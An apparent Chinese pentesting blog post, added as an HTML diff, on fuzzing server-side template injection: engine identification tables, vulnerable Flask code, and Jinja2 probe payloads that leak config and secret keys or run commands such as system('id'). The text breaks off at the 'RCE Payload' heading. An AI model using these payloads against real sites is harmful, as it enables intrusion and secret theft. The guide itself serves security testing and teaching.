@@ -1,0 +1,945 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>SSTI的全面fuzz | Fan's Blog</title><meta name="author" content="Lyifan"><meta name="copyright" content="Lyifan"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="SSTI Fuzz完全测试指南 本笔记详细介绍如何全面测试 SSTI 漏洞，包括各种模板引擎的识别方法、测试 Payload 和利用技巧。   目录 为什么 49 没有反应？ SSTI 基础概念 模板引擎识别方法 各模板引擎详细测试 Payload SSTI 测试流程图 通用 SSTI 测试清单 实战案例分析 自动化测试脚本 防御与修复   一、为什么 49 没有反应？1.1 问题解答你输入 &amp;#">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SSTI的全面fuzz">
+<meta property="og:url" content="http://example.com/2025/12/23/SSTI%E7%9A%84%E5%85%A8%E9%9D%A2fuzz/index.html">
+<meta property="og:site_name" content="Fan&#39;s Blog">
+<meta property="og:description" content="SSTI Fuzz完全测试指南 本笔记详细介绍如何全面测试 SSTI 漏洞，包括各种模板引擎的识别方法、测试 Payload 和利用技巧。   目录 为什么 49 没有反应？ SSTI 基础概念 模板引擎识别方法 各模板引擎详细测试 Payload SSTI 测试流程图 通用 SSTI 测试清单 实战案例分析 自动化测试脚本 防御与修复   一、为什么 49 没有反应？1.1 问题解答你输入 &amp;#">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/img/%E5%A4%B4%E5%83%8F.jpg">
+<meta property="article:published_time" content="2025-12-23T07:11:21.000Z">
+<meta property="article:modified_time" content="2025-12-23T07:17:34.383Z">
+<meta property="article:author" content="Lyifan">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/%E5%A4%B4%E5%83%8F.jpg"><script type="application/ld+json">{
+  "@context": "https://schema.org",
+  "@type": "BlogPosting",
+  "headline": "SSTI的全面fuzz",
+  "url": "http://example.com/2025/12/23/SSTI%E7%9A%84%E5%85%A8%E9%9D%A2fuzz/",
+  "image": "http://example.com/img/%E5%A4%B4%E5%83%8F.jpg",
+  "datePublished": "2025-12-23T07:11:21.000Z",
+  "dateModified": "2025-12-23T07:17:34.383Z",
+  "author": [
+    {
+      "@type": "Person",
+      "name": "Lyifan",
+      "url": "http://example.com"
+    }
+  ]
+}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="http://example.com/2025/12/23/SSTI%E7%9A%84%E5%85%A8%E9%9D%A2fuzz/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: '复制成功',
+    error: '复制失败',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
+    buttonText: '加载更多'
+  },
+  isPhotoFigcaption: false,
+  islazyloadPlugin: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: 'SSTI的全面fuzz',
+  isHighlightShrink: false,
+  isToc: true,
+  pageType: 'post'
+}</script><link rel="stylesheet" href="/css/transpancy.css"><link rel="stylesheet" href="/css/custom.css" /><meta name="generator" content="Hexo 8.1.1"></head><body><div id="web_bg" style="background-image: url(/img/%E8%83%8C%E6%99%AF.png);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/%E5%A4%B4%E5%83%8F.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">4</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">2</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/%E6%A0%87%E7%AD%BE/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 分类</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/sql-injection/"><i class="fa-fw fas fa-database"></i><span> SQL Injection</span></a></li><li><a class="site-page child" href="/categories/xss/"><i class="fa-fw fas fa-code"></i><span> XSS</span></a></li><li><a class="site-page child" href="/categories/upload/"><i class="fa-fw fas fa-file-upload"></i><span> upload</span></a></li><li><a class="site-page child" href="/categories/ssrf/"><i class="fa-fw fas fa-network-wired"></i><span> SSRF</span></a></li><li><a class="site-page child" href="/categories/include/"><i class="fa-fw fas fa-file-code"></i><span> Include</span></a></li><li><a class="site-page child" href="/categories/unserialize/"><i class="fa-fw fas fa-project-diagram"></i><span> Unserialize</span></a></li><li><a class="site-page child" href="/categories/xxe/"><i class="fa-fw fas fa-file-code"></i><span> XXE</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/%E5%8F%8B%E9%93%BE/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background: transparent;"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Fan's Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">SSTI的全面fuzz</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  返回首页</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 首页</span></a></div><div class="menus_item"><a class="site-page" href="/%E6%A0%87%E7%AD%BE/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fas fa-list"></i><span> 分类</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/sql-injection/"><i class="fa-fw fas fa-database"></i><span> SQL Injection</span></a></li><li><a class="site-page child" href="/categories/xss/"><i class="fa-fw fas fa-code"></i><span> XSS</span></a></li><li><a class="site-page child" href="/categories/upload/"><i class="fa-fw fas fa-file-upload"></i><span> upload</span></a></li><li><a class="site-page child" href="/categories/ssrf/"><i class="fa-fw fas fa-network-wired"></i><span> SSRF</span></a></li><li><a class="site-page child" href="/categories/include/"><i class="fa-fw fas fa-file-code"></i><span> Include</span></a></li><li><a class="site-page child" href="/categories/unserialize/"><i class="fa-fw fas fa-project-diagram"></i><span> Unserialize</span></a></li><li><a class="site-page child" href="/categories/xxe/"><i class="fa-fw fas fa-file-code"></i><span> XXE</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/%E5%8F%8B%E9%93%BE/"><i class="fa-fw fas fa-link"></i><span> 友情链接</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">SSTI的全面fuzz</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2025-12-23T07:11:21.000Z" title="发表于 2025-12-23 15:11:21">2025-12-23</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2025-12-23T07:17:34.383Z" title="更新于 2025-12-23 15:17:34">2025-12-23</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/ssti/">ssti</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">浏览量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="SSTI-Fuzz完全测试指南"><a href="#SSTI-Fuzz完全测试指南" class="headerlink" title="SSTI Fuzz完全测试指南"></a>SSTI Fuzz完全测试指南</h1><blockquote>
+<p>本笔记详细介绍如何全面测试 SSTI 漏洞，包括各种模板引擎的识别方法、测试 Payload 和利用技巧。</p>
+</blockquote>
+<hr>
+<h2 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h2><ol>
+<li><a href="#%E4%B8%80%E4%B8%BA%E4%BB%80%E4%B9%88-77-%E6%B2%A1%E6%9C%89%E5%8F%8D%E5%BA%94">为什么 49 没有反应？</a></li>
+<li><a href="#%E4%BA%8Cssti-%E5%9F%BA%E7%A1%80%E6%A6%82%E5%BF%B5">SSTI 基础概念</a></li>
+<li><a href="#%E4%B8%89%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E8%AF%86%E5%88%AB%E6%96%B9%E6%B3%95">模板引擎识别方法</a></li>
+<li><a href="#%E5%9B%9B%E5%90%84%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E8%AF%A6%E7%BB%86%E6%B5%8B%E8%AF%95-payload">各模板引擎详细测试 Payload</a></li>
+<li><a href="#%E4%BA%94ssti-%E6%B5%8B%E8%AF%95%E6%B5%81%E7%A8%8B%E5%9B%BE">SSTI 测试流程图</a></li>
+<li><a href="#%E5%85%AD%E9%80%9A%E7%94%A8-ssti-%E6%B5%8B%E8%AF%95%E6%B8%85%E5%8D%95">通用 SSTI 测试清单</a></li>
+<li><a href="#%E4%B8%83%E5%AE%9E%E6%88%98%E6%A1%88%E4%BE%8B%E5%88%86%E6%9E%90">实战案例分析</a></li>
+<li><a href="#%E5%85%AB%E8%87%AA%E5%8A%A8%E5%8C%96%E6%B5%8B%E8%AF%95%E8%84%9A%E6%9C%AC">自动化测试脚本</a></li>
+<li><a href="#%E4%B9%9D%E9%98%B2%E5%BE%A1%E4%B8%8E%E4%BF%AE%E5%A4%8D">防御与修复</a></li>
+</ol>
+<hr>
+<h2 id="一、为什么-没有反应？"><a href="#一、为什么-没有反应？" class="headerlink" title="一、为什么  没有反应？"></a>一、为什么 49 没有反应？</h2><h3 id="1-1-问题解答"><a href="#1-1-问题解答" class="headerlink" title="1.1 问题解答"></a>1.1 问题解答</h3><p>你输入 <code>&#123;&#123;7*7&#125;&#125;</code> 没有反应，是因为：</p>
+<p><strong>不同的模板引擎使用不同的语法！</strong></p>
+<table>
+<thead>
+<tr>
+<th>模板引擎</th>
+<th>语言</th>
+<th>语法风格</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Jinja2</td>
+<td>Python</td>
+<td><code>&#123;&#123; &#125;&#125;</code></td>
+<td><code>&#123;&#123;7*7&#125;&#125;</code></td>
+</tr>
+<tr>
+<td>Twig</td>
+<td>PHP</td>
+<td><code>&#123;&#123; &#125;&#125;</code></td>
+<td><code>&#123;&#123;7*7&#125;&#125;</code></td>
+</tr>
+<tr>
+<td>Smarty</td>
+<td>PHP</td>
+<td><code>&#123; &#125;</code></td>
+<td><code>&#123;$smarty.version&#125;</code></td>
+</tr>
+<tr>
+<td><strong>ThinkPHP</strong></td>
+<td><strong>PHP</strong></td>
+<td><strong><code>&#123; &#125;</code></strong></td>
+<td><strong><code>&#123;$_SERVER.SERVER_SOFTWARE&#125;</code></strong></td>
+</tr>
+<tr>
+<td>Blade</td>
+<td>PHP</td>
+<td><code>&#123;&#123; &#125;&#125;</code> &#x2F; <code>&#123;!! !!&#125;</code></td>
+<td><code>&#123;&#123;7*7&#125;&#125;</code></td>
+</tr>
+<tr>
+<td>FreeMarker</td>
+<td>Java</td>
+<td><code>$&#123; &#125;</code></td>
+<td><code>$&#123;7*7&#125;</code></td>
+</tr>
+<tr>
+<td>Velocity</td>
+<td>Java</td>
+<td><code>$</code> &#x2F; <code>#</code></td>
+<td><code>$class.inspect()</code></td>
+</tr>
+<tr>
+<td>Mako</td>
+<td>Python</td>
+<td><code>$&#123; &#125;</code> &#x2F; <code>&lt;% %&gt;</code></td>
+<td><code>$&#123;7*7&#125;</code></td>
+</tr>
+<tr>
+<td>ERB</td>
+<td>Ruby</td>
+<td><code>&lt;%= %&gt;</code></td>
+<td><code>&lt;%= 7*7 %&gt;</code></td>
+</tr>
+</tbody></table>
+<h3 id="1-2-ThinkPHP-为什么不认-？"><a href="#1-2-ThinkPHP-为什么不认-？" class="headerlink" title="1.2 ThinkPHP 为什么不认 ？"></a>1.2 ThinkPHP 为什么不认 49？</h3><p>ThinkPHP 使用的是 <strong>ThinkTemplate</strong> 模板引擎（类似 Smarty），它的语法是：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;$变量&#125;           → 输出变量</span><br><span class="line">&#123;$var|修饰符&#125;     → 对变量应用函数</span><br><span class="line">&#123;:函数()&#125;         → 直接调用函数</span><br><span class="line">&#123;if 条件&#125;...&#123;/if&#125; → 条件语句</span><br></pre></td></tr></table></figure>
+
+<p>而 <code>&#123;&#123;7*7&#125;&#125;</code> 是 Jinja2&#x2F;Twig 的语法，ThinkPHP 根本不认识这个语法，所以：</p>
+<ul>
+<li>不会报错（因为它不是 ThinkPHP 的模板标签）</li>
+<li>不会执行（因为它不会被解析）</li>
+<li>原样输出或被忽略</li>
+</ul>
+<h3 id="1-3-教训"><a href="#1-3-教训" class="headerlink" title="1.3 教训"></a>1.3 教训</h3><p><strong>永远不要只用一种 Payload 测试 SSTI！</strong></p>
+<p>不同框架、不同模板引擎的语法完全不同，必须根据目标环境选择正确的测试 Payload。</p>
+<hr>
+<h2 id="二、SSTI-基础概念"><a href="#二、SSTI-基础概念" class="headerlink" title="二、SSTI 基础概念"></a>二、SSTI 基础概念</h2><h3 id="2-1-什么是-SSTI？"><a href="#2-1-什么是-SSTI？" class="headerlink" title="2.1 什么是 SSTI？"></a>2.1 什么是 SSTI？</h3><p><strong>SSTI (Server-Side Template Injection)</strong> 是一种注入漏洞，发生在：</p>
+<ol>
+<li>Web 应用使用模板引擎动态生成页面</li>
+<li>用户输入被不安全地嵌入到模板中</li>
+<li>攻击者可以注入模板语法，让服务器执行任意代码</li>
+</ol>
+<h3 id="2-2-漏洞成因"><a href="#2-2-漏洞成因" class="headerlink" title="2.2 漏洞成因"></a>2.2 漏洞成因</h3><p><strong>安全的模板使用：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python Flask + Jinja2</span></span><br><span class="line">template = <span class="string">&quot;Hello, &#123;&#123; name &#125;&#125;&quot;</span></span><br><span class="line">render_template_string(template, name=user_input)  <span class="comment"># 变量通过参数传递</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>不安全的模板使用（存在 SSTI）：</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 用户输入直接拼接到模板中</span></span><br><span class="line">template = <span class="string">&quot;Hello, &quot;</span> + user_input</span><br><span class="line">render_template_string(template)  <span class="comment"># 危险！</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="2-3-SSTI-的危害"><a href="#2-3-SSTI-的危害" class="headerlink" title="2.3 SSTI 的危害"></a>2.3 SSTI 的危害</h3><table>
+<thead>
+<tr>
+<th>危害等级</th>
+<th>描述</th>
+<th>示例</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>信息泄露</td>
+<td>读取服务器配置、环境变量</td>
+<td><code>&#123;&#123;config&#125;&#125;</code></td>
+</tr>
+<tr>
+<td>任意文件读取</td>
+<td>读取服务器上的任意文件</td>
+<td><code>&#123;&#123;''.__class__.__mro__[2].__subclasses__()...&#125;&#125;</code></td>
+</tr>
+<tr>
+<td><strong>远程代码执行 (RCE)</strong></td>
+<td>在服务器上执行任意命令</td>
+<td><code>&#123;&#123;system('id')&#125;&#125;</code></td>
+</tr>
+<tr>
+<td>服务器接管</td>
+<td>完全控制服务器</td>
+<td>反弹 Shell</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="三、模板引擎识别方法"><a href="#三、模板引擎识别方法" class="headerlink" title="三、模板引擎识别方法"></a>三、模板引擎识别方法</h2><h3 id="3-1-识别流程图"><a href="#3-1-识别流程图" class="headerlink" title="3.1 识别流程图"></a>3.1 识别流程图</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">                ┌─────────────────┐</span><br><span class="line">                │  输入 $&#123;7*7&#125;    │</span><br><span class="line">                └────────┬────────┘</span><br><span class="line">                         │</span><br><span class="line">          ┌──────────────┴──────────────┐</span><br><span class="line">          │                             │</span><br><span class="line">     返回 49                        返回原样</span><br><span class="line">          │                             │</span><br><span class="line">          ▼                             ▼</span><br><span class="line">┌─────────────────┐           ┌─────────────────┐</span><br><span class="line">│ 可能是:          │           │  输入 &#123;&#123;7*7&#125;&#125;   │</span><br><span class="line">│ - FreeMarker    │           └────────┬────────┘</span><br><span class="line">│ - Mako          │                    │</span><br><span class="line">│ - Thymeleaf     │     ┌──────────────┴──────────────┐</span><br><span class="line">└─────────────────┘     │                             │</span><br><span class="line">                   返回 49                        返回原样</span><br><span class="line">                        │                             │</span><br><span class="line">                        ▼                             ▼</span><br><span class="line">              ┌─────────────────┐           ┌─────────────────┐</span><br><span class="line">              │ 可能是:          │           │  输入 &#123;$var&#125;    │</span><br><span class="line">              │ - Jinja2        │           └────────┬────────┘</span><br><span class="line">              │ - Twig          │                    │</span><br><span class="line">              │ - Blade         │     ┌──────────────┴──────────────┐</span><br><span class="line">              └─────────────────┘     │                             │</span><br><span class="line">                                 有反应                         返回原样</span><br><span class="line">                                      │                             │</span><br><span class="line">                                      ▼                             ▼</span><br><span class="line">                            ┌─────────────────┐           ┌─────────────────┐</span><br><span class="line">                            │ 可能是:          │           │  继续测试其他    │</span><br><span class="line">                            │ - Smarty        │           │  模板语法...     │</span><br><span class="line">                            │ - ThinkPHP      │           └─────────────────┘</span><br><span class="line">                            └─────────────────┘</span><br></pre></td></tr></table></figure>
+
+<h3 id="3-2-快速识别表"><a href="#3-2-快速识别表" class="headerlink" title="3.2 快速识别表"></a>3.2 快速识别表</h3><p><strong>第一步：尝试基础数学运算</strong></p>
+<table>
+<thead>
+<tr>
+<th>测试 Payload</th>
+<th>预期输出</th>
+<th>可能的模板引擎</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>$&#123;7*7&#125;</code></td>
+<td><code>49</code></td>
+<td>FreeMarker, Mako, Thymeleaf, Pebble</td>
+</tr>
+<tr>
+<td><code>&#123;&#123;7*7&#125;&#125;</code></td>
+<td><code>49</code></td>
+<td>Jinja2, Twig, Blade, Nunjucks, Django</td>
+</tr>
+<tr>
+<td><code>#&#123;7*7&#125;</code></td>
+<td><code>49</code></td>
+<td>Thymeleaf, FreeMarker</td>
+</tr>
+<tr>
+<td><code>&lt;%= 7*7 %&gt;</code></td>
+<td><code>49</code></td>
+<td>ERB (Ruby), EJS (Node.js)</td>
+</tr>
+<tr>
+<td><code>$&#123;&#123;7*7&#125;&#125;</code></td>
+<td><code>49</code></td>
+<td>Pebble</td>
+</tr>
+<tr>
+<td><code>&#123;7*7&#125;</code></td>
+<td><code>49</code></td>
+<td>Smarty (部分版本)</td>
+</tr>
+</tbody></table>
+<p><strong>第二步：尝试特定引擎的特征 Payload</strong></p>
+<table>
+<thead>
+<tr>
+<th>测试 Payload</th>
+<th>预期输出</th>
+<th>确认的模板引擎</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&#123;&#123;config&#125;&#125;</code></td>
+<td>配置对象</td>
+<td>Jinja2 (Flask)</td>
+</tr>
+<tr>
+<td><code>&#123;&#123;settings&#125;&#125;</code></td>
+<td>设置对象</td>
+<td>Django</td>
+</tr>
+<tr>
+<td><code>&#123;$smarty.version&#125;</code></td>
+<td>版本号</td>
+<td>Smarty</td>
+</tr>
+<tr>
+<td><code>&#123;$_SERVER.SERVER_SOFTWARE&#125;</code></td>
+<td>服务器信息</td>
+<td>ThinkPHP, Smarty</td>
+</tr>
+<tr>
+<td><code>$&#123;T(java.lang.Runtime)&#125;</code></td>
+<td>类信息</td>
+<td>Spring (SpEL)</td>
+</tr>
+<tr>
+<td><code>#set($x=7*7)$x</code></td>
+<td><code>49</code></td>
+<td>Velocity</td>
+</tr>
+</tbody></table>
+<h3 id="3-3-通过错误信息识别"><a href="#3-3-通过错误信息识别" class="headerlink" title="3.3 通过错误信息识别"></a>3.3 通过错误信息识别</h3><p>有时候，故意输入错误的模板语法可以触发错误信息，从而识别模板引擎：</p>
+<table>
+<thead>
+<tr>
+<th>测试 Payload</th>
+<th>可能的错误信息</th>
+<th>模板引擎</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>&#123;&#123;`         | `unexpected end of template` | Jinja2     |
+| `&#123;&#123;&#125;&#125;</code></td>
+<td><code>Empty expression</code></td>
+<td>Twig</td>
+</tr>
+<tr>
+<td><code>&#123;$&#125;</code></td>
+<td><code>Syntax error in template</code></td>
+<td>Smarty</td>
+</tr>
+<tr>
+<td><code>$&#123;</code></td>
+<td><code>Unclosed expression</code></td>
+<td>FreeMarker</td>
+</tr>
+<tr>
+<td><code>&lt;%=</code></td>
+<td><code>SyntaxError</code></td>
+<td>ERB</td>
+</tr>
+</tbody></table>
+<h3 id="3-4-通过响应头-框架识别"><a href="#3-4-通过响应头-框架识别" class="headerlink" title="3.4 通过响应头&#x2F;框架识别"></a>3.4 通过响应头&#x2F;框架识别</h3><p>在测试 SSTI 之前，先收集信息：</p>
+<table>
+<thead>
+<tr>
+<th>信息来源</th>
+<th>如何获取</th>
+<th>可能的线索</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>HTTP 响应头</td>
+<td><code>X-Powered-By</code>, <code>Server</code></td>
+<td>PHP, Python, Java 等</td>
+</tr>
+<tr>
+<td>Cookie 名称</td>
+<td><code>PHPSESSID</code>, <code>JSESSIONID</code></td>
+<td>PHP, Java</td>
+</tr>
+<tr>
+<td>URL 结构</td>
+<td><code>.php</code>, <code>.jsp</code>, <code>.py</code></td>
+<td>后端语言</td>
+</tr>
+<tr>
+<td>错误页面</td>
+<td>触发 404&#x2F;500 错误</td>
+<td>框架名称、版本</td>
+</tr>
+<tr>
+<td>默认页面</td>
+<td>访问根目录</td>
+<td>框架特征</td>
+</tr>
+</tbody></table>
+<p><strong>常见框架与模板引擎对应关系：</strong></p>
+<table>
+<thead>
+<tr>
+<th>框架</th>
+<th>语言</th>
+<th>默认模板引擎</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>Flask</td>
+<td>Python</td>
+<td>Jinja2</td>
+</tr>
+<tr>
+<td>Django</td>
+<td>Python</td>
+<td>Django Templates</td>
+</tr>
+<tr>
+<td>Laravel</td>
+<td>PHP</td>
+<td>Blade</td>
+</tr>
+<tr>
+<td>Symfony</td>
+<td>PHP</td>
+<td>Twig</td>
+</tr>
+<tr>
+<td>ThinkPHP</td>
+<td>PHP</td>
+<td>ThinkTemplate (类 Smarty)</td>
+</tr>
+<tr>
+<td>Spring</td>
+<td>Java</td>
+<td>Thymeleaf, FreeMarker</td>
+</tr>
+<tr>
+<td>Express</td>
+<td>Node.js</td>
+<td>EJS, Pug, Handlebars</td>
+</tr>
+<tr>
+<td>Rails</td>
+<td>Ruby</td>
+<td>ERB</td>
+</tr>
+</tbody></table>
+<hr>
+<h2 id="四、各模板引擎详细测试-Payload"><a href="#四、各模板引擎详细测试-Payload" class="headerlink" title="四、各模板引擎详细测试 Payload"></a>四、各模板引擎详细测试 Payload</h2><h3 id="4-1-Python-Jinja2-Flask"><a href="#4-1-Python-Jinja2-Flask" class="headerlink" title="4.1 Python - Jinja2 (Flask)"></a>4.1 Python - Jinja2 (Flask)</h3><p><strong>识别 Payload：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;7*7&#125;&#125;                          → 49</span><br><span class="line">&#123;&#123;7*&#x27;7&#x27;&#125;&#125;                        → 7777777</span><br><span class="line">&#123;&#123;config&#125;&#125;                       → 配置对象</span><br><span class="line">&#123;&#123;config.items()&#125;&#125;               → 配置详情</span><br><span class="line">&#123;&#123;request.environ&#125;&#125;              → 环境变量</span><br><span class="line">&#123;&#123;self.__class__.__mro__&#125;&#125;       → 类继承链</span><br></pre></td></tr></table></figure>
+
+<p><strong>信息泄露：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;config.SECRET_KEY&#125;&#125;            → Flask 密钥</span><br><span class="line">&#123;&#123;request.application.__self__._get_data_for_json.__globals__[&#x27;json&#x27;].JSONEncoder.default.__globals__[&#x27;current_app&#x27;].config&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><strong>RCE Payload：</strong></p>
